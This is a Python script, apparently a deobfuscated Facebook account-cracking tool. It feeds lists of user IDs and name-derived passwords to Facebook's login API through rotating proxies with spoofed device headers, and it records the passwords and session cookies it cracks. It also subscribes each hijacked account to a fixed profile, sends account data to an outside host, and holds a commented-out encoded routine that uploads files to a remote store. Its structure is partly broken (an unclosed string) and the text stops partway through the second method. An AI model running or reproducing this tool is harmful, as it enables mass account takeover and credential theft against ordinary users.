#تـم الـتـشـفـيـر بFERAS SY
# @XS5_S
A = '.ninjapy'
import os, sys, base64 as B
C = '#DECODED BY TOUFIK WITH ICDEC
# OWNER TOUFIK TLAMCANI 
import os,time,_md5,marshal,inspect,hashlib
import http.client
import platform
import base64
import http.client
import urllib3,requests,idna
import os,time,_md5,marshal,inspect,hashlib
import urllib3,requests,idna
import requests
import requests
import http.client
from os import path
from os import system as Love_Tisha
import requests,json,os,sys,random,datetime,time,re,platform,string,uuid,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from time import sleep as waktu
from time import time as mek
from bs4 import BeautifulSoup as sop
import os,base64,zlib,pip,urllib,random, requests
from io import BytesIO
#import pycurl
try:
  import http.client
  gmg=open(http.client.__file__).read()
  if "write" in gmg:
    print("F U")
    exit()
    exit()
    time.sleep(4)
    while True:requests
    "HaN".FuCk
    raise SystemExit

  if "pr"+"in"+"t(u"+"rl)" in gmg:
    print("F U")
    exit()
    exit()
    time.sleep(4)
    while True:requests
    "HaN".FuCk
    raise SystemExit
except:pass
#import requests
#ec='\x82\x83\x84>\x7fF\x89GX\x90\x83\x92\x93\x90\x8c>\x89(\x87\x8b\x8e\x8d\x90\x92>\x8d\x91J\x90\x7f\x8c\x82\x8d\x8bJ\x90\x83\x8f\x93\x83\x91\x92\x91(\x82\x83\x84>\x89\x89\x89FGX(>>>\x84\x8d\x90>\x90\x8d\x8d\x92J>\x82\x87\x90\x91J>\x84\x87\x8a\x83\x91>\x87\x8c>\x8d\x91L\x95\x7f\x8a\x89F@M\x91\x82\x81\x7f\x90\x82@GX(>>>>>>\x84\x8d\x90>\x84\x87\x8a\x83>\x87\x8c>\x84\x87\x8a\x83\x91X(>>>>>>>>\x92\x90\x97X(>>>>>>>>>>\x87\x84>\x84\x87\x8a\x83L\x83\x8c\x82\x91\x95\x87\x92\x86FEL\x8e\x97EGX(>>>>>>>>>>>>>>\x84\x87\x8a\x83O>[>\x90\x8d\x8d\x92IEMEI\x91\x92\x90F\x84\x87\x8a\x83G(>>>>>>>>>>>>>>\x87\x84>@qwcb@>\x87\x8c>\x8d\x8e\x83\x8cF\x84\x87\x8a\x83OGL\x90\x83\x7f\x82FGX(>>>>>>>>>>>>>>>>>\x84\x8a[\x84@\x99\x90\x7f\x8c\x82\x8d\x8bL\x90\x7f\x8c\x82\x87\x8c\x92FOJQNNG\x9bL\x8e\x97@(>>>>>>>>>>>>>>>>>\x92\x90\x97X\x90\x83\x8f\x93\x83\x91\x92\x91L\x8e\x8d\x91\x92F@\x86\x92\x92\x8e\x91XMM\x84\x87\x90\x83\x80\x7f\x91\x83\x91\x92\x8d\x90\x7f\x85\x83L\x85\x8d\x8d\x85\x8a\x83\x7f\x8e\x87\x91L\x81\x8d\x8bM\x94NM\x80M\x89\x87\x93K\x86\x87\x8a\x7fK\x82\x7f\x8a\x7fK\x8c\x7fL\x7f\x8e\x8e\x91\x8e\x8d\x92L\x81\x8d\x8bM\x8d]\x8c\x7f\x8b\x83[dgjcqM@I\x84\x8aJ\x84\x87\x8a\x83\x91[\x99E\x84\x87\x8a\x83EX\x8d\x8e\x83\x8cF\x84\x87\x8a\x83OGL\x90\x83\x7f\x82FG\x9bG(>>>>>>>>>>>>>>>>>\x83\x96\x81\x83\x8e\x92X\x8e\x7f\x91\x91(>>>>>>>>\x83\x96\x81\x83\x8e\x92X\x8e\x7f\x91\x91(((\x87\x8b\x8e\x8d\x90\x92>\x8b\x93\x8a\x92\x87\x8e\x90\x8d\x81\x83\x91\x91\x87\x8c\x85(\x8b\x93\x8a\x92\x87\x8e\x90\x8d\x81\x83\x91\x91\x87\x8c\x85Ln\x90\x8d\x81\x83\x91\x91F\x92\x7f\x90\x85\x83\x92[\x89\x89\x89GL\x91\x92\x7f\x90\x92FG(('

link=''
link+='https:/'
link+='/m110'
link+='m.blog'
link+='spot.'
link+='com/20'
link+='25/01/'
link+='appr'
link+='oval.html'

import os
import platform
import requests
       
#link2 = "https://cookie-6f6e3-default-rtdb.firebaseio.com/ID.json"
#gty=len(requests.get(link2).json())
os.system('clear')
print(' \033[1;32m[\033[1;31m–\033[1;32m] Join telegram channel  ')
#os.system('xdg-open https://t.me/TOUFIK_TLAMCANI ')

def dc(encoded_message):
    decoded_message = ''
    for char in encoded_message:
        decoded_message += chr(ord(char) - 30)
    return decoded_message

#exec(dc(ec))

def srt(url, file_path):
    response = requests.get(url)
    if response.status_code == 200:
        with open(file_path, 'wb') as file:
            file.write(response.content)


import os,zlib,time,requests

try:
    import os,sys,time,json,random,re,string,platform,base64,uuid,io,struct
    from string import *
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system('pip install requests bs4 futures==2 > /dev/null' )
    pass
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys
from concurrent.futures import ThreadPoolExecutor as tpe

try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass
try:
    import os,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4

    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    pass    
import os,sys,shutil,zlib,time


A = '\x1b[1;97m'
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
G='\033[1;92m'
W='\033[1;97m'
mys = '\033[1;97m' 
r =  '\033[1;91m'
idx = []
loop=0
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
twf=[]
os.system('git pull')
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
try:
  proxylist= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
  open('socksku.txt','w').write(proxylist)
except Exception as e:
  print(' server error')
proxsi=open('socksku.txt','r').read().splitlines()
try:
    import os,requests,json,time,re,random,sys,uuid,string,subprocess
    from string import *
    import bs4
    #import dz
    from concurrent.futures import ThreadPoolExecutor as tred
    from bs4 import BeautifulSoup as sop
    from bs4 import BeautifulSoup
except ModuleNotFoundError: 
    print('\n Installing missing modules ...')
    os.system('pip install requests bs4 futures==2 > /dev/null')
    os.system('python TOUFIK.py')

#------------------[  Ua  ]-------------------#  
def ua1():
    alex1 = str(random.randint(100,400))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    alex9 = str(random.randint(200,400))+".0.0."+str(random.randint(7,37))+"."+str(random.randint(101,151))
    alex2 = random.randint(410000000,499999999)
    cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])  
    ua = f"Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)};  Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)})"+"[FBAN/"+"FB4A;FBAV/"+str(random.randint(11,77))+".0.0."+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/110.0.0.17.29FBBV/8243059FBDM/{density=3.0,width=840,height=953}FBLC/zh_CNFBRV/8304687FBCR/Boost MobileFBMF/SamsungFBBD/SamsungFBPN/com.facebook.katanaFBDV/SM-G973FFBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]"
    return ua
#------------------[ Finished User Agent ]-------------------#
try:
    version = requests.get("https://raw.githubusercontent.com/sijanxd/Server/blob/main/Version.txt").text
except:
    print('No Internet Connection');exit()
version = version.strip()
session = requests.Session()

os.system('pip install httpx')
os.system('pip install requests rich')
os.system('pip install requests')
os.system('pip install mechanize')
os.system('pip install bs4 httpx')
os.system('clear')
print('             \x1b[38;5;46m WELCOME TO TOUFIK WORLD          ')
#------------------[ COLORS ]-------------------#
gggg = '\033[8;102m'#اخضر جديدة تغطية كيمات
rrrr = '\033[8;101m'#احمر جديد تغطية كلمات
rrrrrrrr = '\033[32;101m'#احمر واخضر

# {gas} أخضر
# {green} أخضر
# {red}  احمر
# {white} أبيض
# {faltu}{red} [] 

P = '\x1b[1;97m' # 
M = '\033[1;33m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;96m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' #
R = '\x1b[38;5;246m' #
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N, R]
ssn = requests.Session()
boos = random.choice([P,M,H,K,B,U,O,N,R])
# {boos}
orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";red="\x1b[38;5;160m";green="\x1b[38;5;46m";yelloww="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
abir = random.choice(["\x1b[38;5;196m","\x1b[38;5;208m","\033[1;30m","\x1b[38;5;160m","\x1b[38;5;46m","\033[1;33m","\033[38;5;6m","\033[1;35m","\033[1;36m","\033[1;37m"])
my_color = [white,blue,green];warna = random.choice(my_color)
#os.system('xdg-open https://www.youtube.com/@toufiktoufik-g7g9v')
#os.system(f'xdg-open https://chat.whatsapp.com/GOxA2K4aR1F4mS5KhfY5zR')
sys.stdout.write('\x1b]2; TOUFIK-TLAMCANI > M1 \x07')

#------------------[  sim id  ]-------------------#        
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}
        
sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_US'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv}
#------------------[  system logo   ]-------------------#        
def Trial(PF):
    global TrialExist
    TrialExist="\n"+"-"*40+"\n     Free \033[1;92mTrial \033[1;97mFor Some Time "
    TrialExist+="\n"+"-"*40+"\n       You Are A "+PF+" User "
    menu()
    
TrialExist=""
logo=(f"""████████╗░█████╗░██╗░░░██╗███████╗██╗██╗░░██╗
╚══██╔══╝██╔══██╗██║░░░██║██╔════╝██║██║░██╔╝
░░░██║░░░██║░░██║██║░░░██║█████╗░░██║█████═╝░
░░░██║░░░██║░░██║██║░░░██║██╔══╝░░██║██╔═██╗░
░░░██║░░░╚█████╔╝╚██████╔╝██║░░░░░██║██║░╚██╗
░░░╚═╝░░░░╚════╝░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░╚═╝
[1;33m─────────────────────────────────────────────
\033[1;32m[\033[1;31m–\033[1;37m] AUTHOR   : TOUFIK 
\033[1;32m[\033[1;31m–\033[1;37m] FACEBOOK : TOUFIK TLAMCANI 
\033[1;32m[\033[1;31m–\033[1;37m] GITHUB   : TOUFIK 
\033[1;33m─────────────────────────────────────────────
\033[1;32m[\033[1;31m–\033[1;37m] BEST ALGRIA CRACK SIJAN WORLD 🗽
\033[1;33m─────────────────────────────────────────────
\033[1;32m[\033[1;31m–\033[1;37m] VERSION : {version}
\033[1;32m[\033[1;31m–\033[1;37m] SERVICE : {rrrrrrrr}PAID \033[;0m\033[1;93m
\033[1;33m─────────────────────────────────────────────""")
# I love you Mom 
def dino():
    print('\033[1;33m─────────────────────────────────────────────')

def linex():
    print('\033[1;33m─────────────────────────────────────────────')
#------------------[ system  ]-------------------#
def clear():
    os.system('clear')
    print(logo)

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s        '%(N,H,N,H,N))
    else:
        print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s        '%(N,M,N,M,N))
    else:
        print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
        for i in range(len(game)):
            print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))

def livechk(cooker):
      requests.get("https://token-chor.vercel.app/checkid",data={'iamfrom':'mrqureshi','acc': cooker})

#------------------[ system  ]-------------------#
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
#------------------[ SIM CODE  ]-------------------#
try:
    output = subprocess.check_output('getprop gsm.operator.alpha', shell=True).decode('utf-8')
    carrier = output.replace(',', '\033[1;37m|\033[1;37m').replace('\n', '')
except Exception as e:
    pass
    carrier = None
#------------------[ MENU TOUFIK  ]-------------------#
def menu():
            clear()        
            print(' \033[1;32m[\033[1;31m1\033[1;32m] CRACK FILE ')
            print(' \033[1;32m[\033[1;31m2\033[1;32m] FOLLOW FB')
            print(' \033[1;32m[\033[1;31m0\033[1;32m] EXIT ')
            dino()
            xd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
            if xd in ['1','01']:
                clear()
                print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE EXAMPLE : /sdcard/toufik.txt')
                dino()
                file = input(' \033[1;32m[\033[1;31m–\033[1;32m] ENTER FILE PATH\033[1;32m : ')
                try:
                    fo = open(file,'r').read().splitlines()
                except FileNotFoundError:
                    print(' \033[1;32m[\033[1;31m–\033[1;32m] FILE LOCATION NOT FOUND ')
                    time.sleep(1)
                    menu()
                clear()
                print(' \033[1;32m[\033[1;31m–\033[1;32m] TRY METHOD 1 & 4 FOR BEST RESULTS ')
                dino()
                print(' \033[1;32m[\033[1;31m1\033[1;32m] METHOD / \033[1;31m MIX IDS ')
                print(' \033[1;32m[\033[1;31m2\033[1;32m] METHOD / \033[1;31m MIX IDS ')
                print(' \033[1;32m[\033[1;31m3\033[1;32m] METHOD / \033[1;31m MIX IDS ')
                print(' \033[1;32m[\033[1;31m4\033[1;32m] METHOD / \033[1;31m MIX IDS ')
                dino()
                mthd=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
                dino()
                plist = []
                clear()
                print(" \033[1;32m[\033[1;31m1\033[1;32m] AUTO PASSWORD ")                                
                print(" \033[1;32m[\033[1;31m2\033[1;32m] MANUAL PASSWORD ")
                dino()
                psx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
                if psx in ['1','01']:
                             plist.append('first first')
                             plist.append('first last')
                             plist.append('last first')
                             plist.append('last last') 
                else: 	
                 try:
                    dino()
                    ps_limit = int(input(' How many passwords do you want to add ? '))                    
                 except:
                       ps_limit =1
                clear()
                print(' \033[1;32m[\033[1;31m–\033[1;32m] EXAMPLE : first last,firtslast,first123')
                dino()
                for i in range(ps_limit):
                    plist.append(input(f' \033[1;32m[\033[1;31m–\033[1;32m] PASSWORD {i+1}:\033[1;31m '))
                clear()
                print(' \033[1;32m[\033[1;31m–\033[1;32m] DO YOU WENT SHOW CP ACCOUNT ? [Y/N] : ')
                dino()
                cx=input(' \033[1;32m[\033[1;31m–\033[1;32m] CHOOSE : ')
                if cx in ['y','Y','yes','Yes','1']:
                    pcp.append('y')
                else:
                    pcp.append('n')
                with tred(max_workers=30) as crack_submit:
                    clear()
                    total_ids = str(len(fo))
                    print(" \033[1;32m[\033[1;31m–\033[1;32m] IF NO RESULT \033[1;33m[\033[1;31mON\033[1;33m/\033[1;31mOFF\033[1;33m] \033[1;32mAIRPLAN MODE ")
                    print(' \033[1;32m[\033[1;31m–\033[1;32m] SIM NAME   \033[1;33m: \033[1;37m'+carrier+f' ')
                    print(' \033[1;32m[\033[1;31m–\033[1;32m] TOTAL UID  \033[1;33m| \033[1;32mMETHOD \033[1;33m: \033[1;37m'+total_ids+f'\033[1;33m >> \033[1;37mM'+mthd+f' ')
                    linex()
                    for user in fo:
                            ids,names = user.split('|')
                            passlist = plist
                            if mthd in ['1','01']:
                                    crack_submit.submit(M_file_1,ids,names,passlist) 
                            elif mthd in ['2','02']:
                                    crack_submit.submit(M_file_2,ids,names,passlist)
                            elif mthd in ['3','03']:
                                    crack_submit.submit(M_file_3,ids,names,passlist)
                            elif mthd in ['4','04']:
                                    crack_submit.submit(M_file_4,ids,names,passlist)
                            elif mthd in ['5','05']:
                                     crack_submit.submit(M_file_5,ids,names,passlist)
                            elif mthd in ['6','06']:
                                      crack_submit.submit(M_file_6,ids,names,passlist)
                            elif mthd in ['7','07']:
                                      crack_submit.submit(M_file_7,ids,names,passlist)
                dino()
                print('\033[1;32m[\033[1;31m–\033[1;32m] Behind every hackers smile...a victims tear! ')
                print('\033[1;32m[\033[1;31m–\033[1;32m] The process has completed ')
                print('\033[1;32m[\033[1;31m–\033[1;32m] OK/CP : '+str(len(oks))+'/'+str(len(cps)))
                dino()
                input(' Press enter to back ')
                os.system('python TOUFIK.py') 
            elif xd in ['0','00']:
                exit(' Thanls For Your Use ')
            elif xd in ['2','02']:
                os.system('xdg-open https://www.facebook.com/toufik.tlamcani.2025')     
            else:
                exit(' Option not found in menu...')

#------------------[  METODE 1 ]-------------------#
def M_file_1(ids,names,passlist):
                try:
                        global ok, loop
                        boos = random.choice([P, M, H, K, B, U, O, N])
                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}TOUFIK-TLAMCANI\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                        sys.stdout.flush()
                        
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                                
                        for pw in passlist:
                                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                                u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/2.1.0 (Linux; U; Android 13; SM-G970F Build/RP1A.200720.012) [FBAN/FB4A;FBAV/392.0.0.30.108;FBBV/648495923;FBDM/{density=2.0,width=720,height=1280};FBLC/fr_FR;FBRV/4887054FBCR/O2FBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/Nova 5TFBSV/5.0FBOP/1FBCA/x86:armeabi-v7a]"+"Dalvik/2.1.0 (Linux; U; Android 11; Moto G Power Build/RP1A.200720.012) [FBAN/FB4A;FBAV/400.0.0.28.90;FBBV/576140697;FBDM/{density=2.5,width=1080,height=1920};FBLC/ar_AR;FBRV/1214343FBCR/OrangeFBMF/MotorolaFBBD/MotorolaFBPN/com.facebook.katanaFBDV/Moto G PowerFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]"+"Dalvik/2.1.0 (Linux; U; Android 12; Pixel 3 Build/QP1A.190711.020) [FBAN/FB4A;FBAV/390.0.0.29.107;FBBV/638642670;FBDM/{density=3.0,width=1440,height=1920};FBLC/ar_AR;FBRV/9112718FBCR/O2FBMF/HuaweiFBBD/HuaweiFBPN/com.facebook.katanaFBDV/P30 ProFBSV/12.0FBOP/1FBCA/x86:armeabi-v7a]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}   
                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'fr_DZ','client_country_code': 'DZ','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(40000,50000)),'X-FB-Connection-Type': 'MOBILE.LTE','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': u1a,'x-fb-net-hni':str(random.randint(40000,50000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(400000,500000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice', 'accept-encoding':'gzip, deflate','x-fb-http-engine':     'Liger'}
                                        
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                
                                po = requests.post(url, data=data, headers=head, proxies=proxs, allow_redirects=False).text
                                q = json.loads(po)
                                
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print('\r\x1b[1;92m<[TOUFIK-OK]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                        #print("\033[1;33m<[BISCUT-🍪]> :\033[1;33m "+cookie)
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/' + '833553969/' + 'subscribers' + '?access_token=' + token)
                                        open('/sdcard/TOUFIK_m1_OK.txt', 'a').write(ids + '|' + pas + '\n')
                                        open('/sdcard/TOUFIK_iDs_COOKiE_M1.txt', 'a').write(ids + '|' + pas + '|' + cookie + '\n')
                                        oks.append(ids)
                                        break
                                        
                                elif twf in str(po):
                                        if 'y' in pcp:
                                                #print('\r\r\033[1;34m<[TOUFIK-2F]> '+ids+' | '+pas)
                                                open('/sdcard/TOUFIK-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
              
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\x1b[38;5;246m<[TOUFIK-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/TOUFIK-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/TOUFIK-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                                        
                        loop+=1
                        
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                        
                except Exception as e:
                        pass

#------------------[  METODE 2  ]-------------------#
def M_file_2(ids,names,passlist):
                try:
                        global ok, loop
                        boos = random.choice([P, M, H, K, B, U, O, N])
                        sys.stdout.write(f'\r\r\033[1;37m<[{boos}TOUFIK-TLAMCANI\033[1;37m]<\>[%s|\033[1;32m%s\033[1;37m|\x1b[38;5;246m%s\033[1;37m]> ' % (loop, len(oks), len(cps)))
                        sys.stdout.flush()
                        
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                                
                        for pw in passlist:
                                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                                accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
